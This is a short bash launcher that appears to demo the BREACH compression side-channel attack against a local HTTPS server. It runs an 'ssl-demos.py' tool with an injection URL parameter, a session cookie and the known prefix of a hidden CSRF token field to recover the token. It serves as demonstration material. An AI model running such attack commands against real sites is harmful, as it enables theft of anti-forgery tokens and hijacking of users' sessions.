#!/bin/bash

export PYTHONPATH=.

./scripts/ssl-demos.py -u 'https://127.0.0.1:2000?affiliate={DATA}' -p 2000 -i 127.0.0.1 -b 'SESSION=0372e249-7932-41ba-8dbb-6e79e991c8e7' -P 'input type="hidden" name="csrftoken" value="' Breach -t 7b38918f6fcd5b2f1245fece252034b1d61bbf67452952dd47c8ac296a3c1b72 --bright
